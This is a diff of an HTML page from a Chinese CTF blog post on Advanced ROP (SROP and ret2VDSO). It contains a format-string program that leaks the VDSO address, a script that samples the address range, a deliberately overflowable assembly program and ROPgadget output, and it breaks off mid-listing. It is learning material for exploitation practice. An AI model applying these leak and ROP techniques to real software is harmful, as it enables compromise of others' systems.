@@ -1,87 +1,174 @@
 <!DOCTYPE html>
+
 <html lang="zh-Hans">
+
 <head><meta name="generator" content="Hexo 3.9.0">
 
+
+
     <!--[if lt IE 9]>
+
         <style>body {display: none; background: none !important} </style>
+
         <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+
     <![endif]-->
 
+
+
 <meta charset="utf-8">
+
 <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
 <meta name="format-detection" content="telephone=no">
+
 <meta name="author" content="binLep">
 
 
 
+
+
+
+
 <meta name="description" content="学习总结">
+
 <meta name="keywords" content="CTF, Pwn, Sec">
+
 <meta property="og:type" content="article">
+
 <meta property="og:title" content="【Pwn 笔记】栈溢出利用总结 -- Advanced ROP">
+
 <meta property="og:url" content="https://binlep.github.io/old_blog_01/2020/03/03/【Pwn 笔记】栈溢出利用总结 -- Advanced ROP/index.html">
+
 <meta property="og:site_name" content="binLep&#39;s Blog">
+
 <meta property="og:description" content="学习总结">
+
 <meta property="og:locale" content="zh-Hans">
+
 <meta property="og:updated_time" content="2020-03-03T04:39:49.336Z">
+
 <meta name="twitter:card" content="summary">
+
 <meta name="twitter:title" content="【Pwn 笔记】栈溢出利用总结 -- Advanced ROP">
+
 <meta name="twitter:description" content="学习总结">
 
-<link rel="apple-touch-icon" href="/old_blog_01/apple-touch-icon.png">
 
 
-    <link rel="alternate" href="/old_blog_01/atom.xml" title="binLep&#39;s Blog" type="application/atom+xml">
-
-
-
-    <link rel="shortcut icon" href="/old_blog_01/favicon.png">
+<link rel="apple-touch-icon" href="old_blog_01//apple-touch-icon.png">
 
 
 
-    <link href="/old_blog_01//cdnjs.cloudflare.com/ajax/libs/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+    <link rel="alternate" href="old_blog_01//atom.xml" title="binLep&#39;s Blog" type="application/atom+xml">
 
 
 
-    <link href="/old_blog_01//cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
 
 
 
-    <script src="/old_blog_01//cdnjs.cloudflare.com/ajax/libs/pace/1.0.2/pace.min.js"></script>
-    <link href="/old_blog_01//cdnjs.cloudflare.com/ajax/libs/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+    <link rel="shortcut icon" href="old_blog_01//favicon.png">
+
+
+
+
+
+
+
+    <link href="//cdnjs.cloudflare.com/ajax/libs/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+
+
+
+
+    <link href="//cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+
+
+
+
+    <script src="//cdnjs.cloudflare.com/ajax/libs/pace/1.0.2/pace.min.js"></script>
+
+    <link href="//cdnjs.cloudflare.com/ajax/libs/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+
 
 
 <link rel="stylesheet" href="../../../../css/style.css">
 
 
 
-<link href="/old_blog_01//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+
+
+<link href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+
 
 
 <title>【Pwn 笔记】栈溢出利用总结 -- Advanced ROP | binLep&#39;s Blog</title>
 
-<script src="/old_blog_01//cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
-<script src="/old_blog_01//cdnjs.cloudflare.com/ajax/libs/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+
+<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+
+<script src="//cdnjs.cloudflare.com/ajax/libs/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+
 
 <script>
+
     var yiliaConfig = {
+
         fancybox: true,
+
         animate: true,
+
         isHome: false,
+
         isPost: true,
+
         isArchive: false,
+
         isTag: false,
+
         isCategory: false,
+
         fancybox_js: "//cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.5/jquery.fancybox.min.js",
+
         scrollreveal: "//cdnjs.cloudflare.com/ajax/libs/scrollReveal.js/3.1.4/scrollreveal.min.js",
+
         search: true
+
     }
+
 </script>
 
 
+
+
+
     <script>
+
         yiliaConfig.jquery_ui = [true, "//cdnjs.cloudflare.com/ajax/libs/jqueryui/1.10.4/jquery-ui.min.js", "//cdnjs.cloudflare.com/ajax/libs/jqueryui/1.10.4/css/jquery-ui.min.css"];
+
     </script>
+
+
+
+
 
 
 
@@ -92,366 +179,733 @@
 
 
 
+
+
+
+
+
+
+
 </head></html>
+
 <body>
+
   <div id="container">
+
     <div class="left-col">
+
     <div class="overlay"></div>
+
 <div class="intrude-less">
+
     <header id="header" class="inner">
-        <a href="/old_blog_01/" class="profilepic">
-            <img src="/old_blog_01/img/avatar.png" class="animated zoomIn">
+
+        <a href="old_blog_01//" class="profilepic">
+
+            <img src="old_blog_01//img/avatar.png" class="animated zoomIn">
+
         </a>
+
         <hgroup>
-          <h1 class="header-author"><a href="/old_blog_01/">binLep</a></h1>
+
+          <h1 class="header-author"><a href="old_blog_01//">binLep</a></h1>
+
         </hgroup>
 
+
+
         
+
         <p class="header-subtitle">图片托管在github，国内访问会很慢QWQ</p>
-        
 
         
+
+
+
+        
+
             <form id="search-form">
+
             <input type="text" id="local-search-input" name="q" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off" searchonload="" />
+
             <i class="fa fa-times" onclick="resetSearch()"></i>
+
             </form>
+
             <div id="local-search-result"></div>
+
             <p class='no-result'>No results found <i class='fa fa-spinner fa-pulse'></i></p>
+
         
 
 
+
+
+
         
+
             <div id="switch-btn" class="switch-btn">
+
                 <div class="icon">
+
                     <div class="icon-ctn">
+
                         <div class="icon-wrap icon-house" data-idx="0">
+
                             <div class="birdhouse"></div>
+
                             <div class="birdhouse_holes"></div>
+
                         </div>
+
                         <div class="icon-wrap icon-ribbon hide" data-idx="1">
+
                             <div class="ribbon"></div>
+
                         </div>
+
                         
+
                         
+
                         <div class="icon-wrap icon-me hide" data-idx="3">
+
                             <div class="user"></div>
+
                             <div class="shoulder"></div>
+
                         </div>
+
                         
+
                     </div>
+
                     
+
                 </div>
+
                 <div class="tips-box hide">
+
                     <div class="tips-arrow"></div>
+
                     <ul class="tips-inner">
+
                         <li>菜单</li>
+
                         <li>标签</li>
+
                         
+
                         
+
                         <li>关于我</li>
+
                         
+
                     </ul>
+
                 </div>
+
             </div>
+
         
+
+
 
         <div id="switch-area" class="switch-area">
+
             <div class="switch-wrap">
+
                 <section class="switch-part switch-part1">
+
                     <nav class="header-menu">
+
                         <ul>
+
                         
+
                             <li><a href="../../../../index.html">主页</a></li>
+
                         
+
                             <li><a href="../../../../archives/">所有文章</a></li>
+
                         
+
                             <li><a href="../../../../tags/">标签云</a></li>
+
                         
+
                             <li><a href="../../../../about/">关于我</a></li>
+
                         
+
                             <li><a href="../../../../friends/">友情链接</a></li>
+
                         
+
                         </ul>
+
                     </nav>
+
                     <nav class="header-nav">
+
                         <ul class="social">
+
                             
-                                <a class="fa Email" href="mailto:1723569975@qq.com" title="Email"></a>
+
+                                <a class="fa Email" href="old_blog_01/mailto:1723569975@qq.com" title="Email"></a>
+
                             
+
                                 <a class="fa RSS" href="../../../../atom.xml" title="RSS"></a>
+
                             
+
                         </ul>
+
                     </nav>
+
                 </section>
-                
-                
-                <section class="switch-part switch-part2">
-                    <div class="widget tagcloud" id="js-tagcloud">
-                        <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/BugkuCTF/">BugkuCTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/CryptixCTF/">CryptixCTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/Event/">Event</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/Hackme-CTF/">Hackme CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/Jarvis-OJ/">Jarvis OJ</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/Linux-Pwn/">Linux Pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/MOCTF/">MOCTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/Newark-Academy-CTF/">Newark Academy CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/Platform/">Platform</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/Platfrom/">Platfrom</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/Pwn/">Pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/RSA/">RSA</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/RSCTF/">RSCTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/Web/">Web</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/Windows-Pwn/">Windows Pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/XMan/">XMan</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/mipsel/">mipsel</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/ret2libc/">ret2libc</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/ret2shellcode/">ret2shellcode</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/xml注入/">xml注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/使用教程/">使用教程</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/安装教程/">安装教程</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/搭建Hexo/">搭建Hexo</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/攻防世界/">攻防世界</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/模板/">模板</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/玄武杯/">玄武杯</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/环境搭建/">环境搭建</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/问题汇总/">问题汇总</a></li></ul>
-                    </div>
-                </section>
-                
-                
+
                 
 
                 
-                
-                <section class="switch-part switch-part3">
-                
-                    <div id="js-aboutme">Pwn路上的小萌新~</div>
+
+                <section class="switch-part switch-part2">
+
+                    <div class="widget tagcloud" id="js-tagcloud">
+
+                        <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/BugkuCTF/">BugkuCTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/CryptixCTF/">CryptixCTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/Event/">Event</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/Hackme-CTF/">Hackme CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/Jarvis-OJ/">Jarvis OJ</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/Linux-Pwn/">Linux Pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/MOCTF/">MOCTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/Newark-Academy-CTF/">Newark Academy CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/Platform/">Platform</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/Platfrom/">Platfrom</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/Pwn/">Pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/RSA/">RSA</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/RSCTF/">RSCTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/Web/">Web</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/Windows-Pwn/">Windows Pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/XMan/">XMan</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/mipsel/">mipsel</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/ret2libc/">ret2libc</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/ret2shellcode/">ret2shellcode</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/xml注入/">xml注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/使用教程/">使用教程</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/安装教程/">安装教程</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/搭建Hexo/">搭建Hexo</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/攻防世界/">攻防世界</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/模板/">模板</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/玄武杯/">玄武杯</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/环境搭建/">环境搭建</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/问题汇总/">问题汇总</a></li></ul>
+
+                    </div>
+
                 </section>
+
                 
+
+                
+
+                
+
+
+
+                
+
+                
+
+                <section class="switch-part switch-part3">
+
+                
+
+                    <div id="js-aboutme">Pwn路上的小萌新~</div>
+
+                </section>
+
+                
+
             </div>
+
         </div>
+
     </header>                
+
 </div>
+
     </div>
+
     <div class="mid-col">
+
       <nav id="mobile-nav">
+
       <div class="overlay">
+
           <div class="slider-trigger"></div>
-          <h1 class="header-author js-mobile-header hide"><a href="/old_blog_01/" title="回到主页">binLep</a></h1>
+
+          <h1 class="header-author js-mobile-header hide"><a href="old_blog_01//" title="回到主页">binLep</a></h1>
+
       </div>
+
     <div class="intrude-less">
+
         <header id="header" class="inner">
-            <a href="/old_blog_01/" class="profilepic">
-                <img src="/old_blog_01/img/avatar.png" class="animated zoomIn">
+
+            <a href="old_blog_01//" class="profilepic">
+
+                <img src="old_blog_01//img/avatar.png" class="animated zoomIn">
+
             </a>
+
             <hgroup>
-              <h1 class="header-author"><a href="/old_blog_01/" title="回到主页">binLep</a></h1>
+
+              <h1 class="header-author"><a href="old_blog_01//" title="回到主页">binLep</a></h1>
+
             </hgroup>
+
             
+
             <p class="header-subtitle">图片托管在github，国内访问会很慢QWQ</p>
+
             
+
             <nav class="header-menu">
+
                 <ul>
+
                 
+
                     <li><a href="../../../../index.html">主页</a></li>
+
                 
+
                     <li><a href="../../../../archives/">所有文章</a></li>
+
                 
+
                     <li><a href="../../../../tags/">标签云</a></li>
+
                 
+
                     <li><a href="../../../../about/">关于我</a></li>
+
                 
+
                     <li><a href="../../../../friends/">友情链接</a></li>
+
                 
+
                 <div class="clearfix"></div>
+
                 </ul>
+
             </nav>
+
             <nav class="header-nav">
+
                         <ul class="social">
+
                             
-                                <a class="fa Email" target="_blank" href="mailto:1723569975@qq.com" title="Email"></a>
+
+                                <a class="fa Email" target="_blank" href="old_blog_01/mailto:1723569975@qq.com" title="Email"></a>
+
                             
+
                                 <a class="fa RSS" target="_blank" href="../../../../atom.xml" title="RSS"></a>
+
                             
+
                         </ul>
+
             </nav>
+
         </header>                
+
     </div>
+
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
+
 </nav>
+
       <div class="body-wrap"><article id="post-【Pwn 笔记】栈溢出利用总结 -- Advanced ROP" class="article article-type-post" itemscope itemprop="blogPost">
+
   
+
     <div class="article-meta">
+
       <a href="" class="article-date">
+
       <time datetime="2020-03-03T09:16:00.000Z" itemprop="datePublished">2020-03-03</time>
+
 </a>
 
 
+
+
+
     </div>
+
   
+
   <div class="article-inner">
+
     
+
       <input type="hidden" class="isFancy" />
+
     
+
     
+
       <header class="article-header">
+
         
+
   
+
     <h1 class="article-title" itemprop="name">
+
       【Pwn 笔记】栈溢出利用总结 -- Advanced ROP
+
     </h1>
+
   
+
+
 
       </header>
+
       
+
       <div class="article-info article-info-post">
+
         
+
     <div class="article-category tagcloud">
+
     <a class="article-category-link" href="../../../../categories/Pwn-笔记/">Pwn 笔记</a>
+
     </div>
 
 
+
+
+
         
+
         <div class="clearfix"></div>
+
       </div>
+
       
+
     
+
     <div class="article-entry" itemprop="articleBody">
+
       
+
           
+
         <p>学习总结</p>
+
 <a id="more"></a>
 
+
+
 <h1 id="SROP"><a href="#SROP" class="headerlink" title="SROP"></a>SROP</h1><p>这个套脚本基本就完了，先不细看了</p>
+
 <h1 id="ret2VDSO"><a href="#ret2VDSO" class="headerlink" title="ret2VDSO"></a>ret2VDSO</h1><h2 id="VDSO-简述"><a href="#VDSO-简述" class="headerlink" title="VDSO 简述"></a>VDSO 简述</h2><p>VDSO (Virtual Dynamically-linked Shared Object)，中文名是：虚拟动态共享对象</p>
+
 <p>它是一个内核会自动映射到每个用户进程的地址空间的小型共享库</p>
+
 <p>简单来说，可以把 VDSO 看成一个 .so 动态库链接文件，但是不同的内核，VDSO 的内容也是不同的</p>
+
 <p>利用 ldd 命令就能看到 VDSO 的动态地址了，每次使用命令的时候 VDSO 的地址都会改变，如下：</p>
+
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@lepPwn:~/CTF/Pwn<span class="comment"># ldd /bin/sh</span></span><br><span class="line">	linux-vdso.so.1 =&gt;  (0x00007ffc0ddb9000)</span><br><span class="line">	libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f5a2e1f2000)</span><br><span class="line">	/lib64/ld-linux-x86-64.so.2 (0x00007f5a2e7e4000)</span><br></pre></td></tr></table></figure>
 
+
+
 <p>这里<code>linux-vdso.so.1</code>指的就是 VDSO，在 32 位程序下，这块的名字是<code>linux-gate.so.1</code>，都是一个意思</p>
+
 <h2 id="关于-VDSO-在内存中的存储"><a href="#关于-VDSO-在内存中的存储" class="headerlink" title="关于 VDSO 在内存中的存储"></a>关于 VDSO 在内存中的存储</h2><p>VDSO 在内存里的存储地址最方便利用的有两处：</p>
+
 <p><strong>第一处 栈空间里：</strong></p>
+
 <p>这个方法是接下来泄露 VDSO 的首要方法，地址需要自己去调试更改</p>
+
 <p>因为同一个程序在不同的系统里，VDSO 的地址在栈空间内存放的地址偏移是不一样的</p>
+
 <p><strong>第二处 _rtld_global_ro：</strong></p>
+
 <p>这里是直接用 gdb 来显示 VDSO 的地址，这个地址是在程序加载时映射到<code>ld.so</code>文件里的</p>
+
 <p>比如 32 位 libc 2.29，该地址就在程序运行的时候被映射到<code>/usr/lib/i386-linux-gnu/ld-2.29.so</code>里</p>
+
 <p>查看存储 VDSO 地址的地址</p>
+
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p &amp;_rtld_global_ro._dl_sysinfo_dso</span><br></pre></td></tr></table></figure>
 
+
+
 <p>查看 VDSO 的地址</p>
+
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p _rtld_global_ro._dl_sysinfo_dso</span><br></pre></td></tr></table></figure>
 
+
+
 <h2 id="获取-VDSO-的动态加载地址"><a href="#获取-VDSO-的动态加载地址" class="headerlink" title="获取 VDSO 的动态加载地址"></a>获取 VDSO 的动态加载地址</h2><p>写一个 C 语言程序来查看即可，以下脚本基本都是由 EX 师傅所写，会有略微的修改</p>
+
 <p>基本上 VDSO 的地址会在 123-125 左右浮动：</p>
+
 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// compiled: gcc -g -m32 get_vdso_addr.c -o get_vdso_addr</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"vdso addr: %123$p\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
+
+
 <p>该程序输出如下：</p>
+
 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vdso addr: <span class="number">0xf7f75000</span></span><br></pre></td></tr></table></figure>
 
+
+
 <p>这后面的地址是会变的，不过<strong>不同的系统会有会有固定的最大值和最小值</strong></p>
+
 <p>写个 python 脚本来获取当前系统 VDSO 地址的最大值和最小值：</p>
+
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">result = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">10000</span>):</span><br><span class="line">    result.append(os.popen(<span class="string">'./get_vdso_addr'</span>).read()[<span class="number">-11</span>:<span class="number">-1</span>])</span><br><span class="line"></span><br><span class="line">result = sorted(result)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">'[\033[0;32m+\033[0m]min = '</span> + result[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[\033[0;32m+\033[0m]max = '</span> + result[len(result) - <span class="number">1</span>]</span><br></pre></td></tr></table></figure>
 
+
+
 <p>输出如下：</p>
+
 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[+]min = <span class="number">0xf7ed8000</span></span><br><span class="line">[+]max = <span class="number">0xf7fd7000</span></span><br></pre></td></tr></table></figure>
 
+
+
 <p>于是我们就获取了 VDSO 的动态加载地址</p>
+
 <h2 id="实例解析"><a href="#实例解析" class="headerlink" title="实例解析"></a>实例解析</h2><h3 id="源程序"><a href="#源程序" class="headerlink" title="源程序"></a>源程序</h3><p>原程序(ret2VDSO.s)如下：</p>
+
 <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">push</span> <span class="built_in">ebp</span></span><br><span class="line"><span class="keyword">mov</span>    <span class="built_in">ebp</span>, <span class="built_in">esp</span></span><br><span class="line"><span class="keyword">sub</span>    <span class="built_in">esp</span>, <span class="number">128</span></span><br><span class="line"><span class="keyword">lea</span>    <span class="built_in">eax</span>, buf</span><br><span class="line"><span class="keyword">push</span> <span class="number">4096</span></span><br><span class="line"><span class="keyword">push</span> <span class="built_in">eax</span></span><br><span class="line"><span class="keyword">push</span> <span class="number">0</span></span><br><span class="line"><span class="keyword">mov</span>    <span class="built_in">eax</span>, <span class="number">0</span></span><br><span class="line"><span class="keyword">call</span>    read</span><br><span class="line"><span class="keyword">add</span> <span class="built_in">esp</span>, <span class="number">12</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">esi</span>, <span class="built_in">eax</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">push</span> <span class="built_in">esi</span></span><br><span class="line"><span class="keyword">lea</span> <span class="built_in">eax</span>, buf</span><br><span class="line"><span class="keyword">push</span> <span class="built_in">eax</span> </span><br><span class="line"><span class="keyword">lea</span> <span class="built_in">eax</span>, -<span class="number">128</span>[<span class="built_in">ebp</span>]</span><br><span class="line"><span class="keyword">push</span> <span class="built_in">eax</span></span><br><span class="line"><span class="keyword">call</span> memcpy</span><br><span class="line"><span class="keyword">add</span> <span class="built_in">esp</span>, <span class="number">12</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">lea</span> <span class="built_in">eax</span>, -<span class="number">128</span>[<span class="built_in">ebp</span>]</span><br><span class="line"><span class="keyword">push</span> <span class="built_in">esi</span></span><br><span class="line"><span class="keyword">push</span> <span class="built_in">eax</span></span><br><span class="line"><span class="keyword">push</span> <span class="number">1</span></span><br><span class="line"><span class="keyword">mov</span>    <span class="built_in">eax</span>, <span class="number">0</span></span><br><span class="line"><span class="keyword">call</span>    write</span><br><span class="line"><span class="keyword">add</span> <span class="built_in">esp</span>, <span class="number">12</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">mov</span>    <span class="built_in">eax</span>, <span class="number">0</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">esp</span>, <span class="built_in">ebp</span></span><br><span class="line"><span class="keyword">pop</span> <span class="built_in">ebp</span></span><br><span class="line"><span class="keyword">ret</span></span><br></pre></td></tr></table></figure>
 
+
+
 <p>反汇编出来的程序如下：</p>
+
 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> size; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">char</span> addr[<span class="number">128</span>]; <span class="comment">// [esp+0h] [ebp-80h]</span></span><br><span class="line"></span><br><span class="line">  size = read(<span class="number">0</span>, buf, <span class="number">0x1000</span>u);</span><br><span class="line">  <span class="built_in">memcpy</span>(addr, buf, size);</span><br><span class="line">  write(<span class="number">1</span>, addr, size);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
+
+
 <p>因为是手写汇编而来的程序，所以并不能依赖 glibc：</p>
+
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@lepPwn:~/CTF/Pwn<span class="comment"># ldd ret2VDSO </span></span><br><span class="line">	不是动态可执行文件</span><br></pre></td></tr></table></figure>
 
+
+
 <p>查看有没有什么可用的 ROP：</p>
+
 <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">root@lepPwn:</span>~/CTF/Pwn# ROPgadget --binary ret2VDSO </span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line"><span class="number">0x080480b2</span> : <span class="keyword">adc</span> <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">eax</span> + <span class="number">3</span>], <span class="number">bh</span> <span class="comment">; int 0x80</span></span><br><span class="line"><span class="number">0x080480c9</span> : <span class="keyword">adc</span> <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">eax</span> + <span class="number">4</span>], <span class="number">bh</span> <span class="comment">; int 0x80</span></span><br><span class="line"><span class="number">0x08048102</span> : <span class="keyword">adc</span> <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">edi</span> - <span class="number">0x21</span>], <span class="number">dh</span> <span class="comment">; leave ; ret</span></span><br><span class="line"><span class="number">0x080480cb</span> : <span class="keyword">add</span> <span class="built_in">al</span>, <span class="number">0</span> <span class="comment">; add byte ptr [eax], al ; int 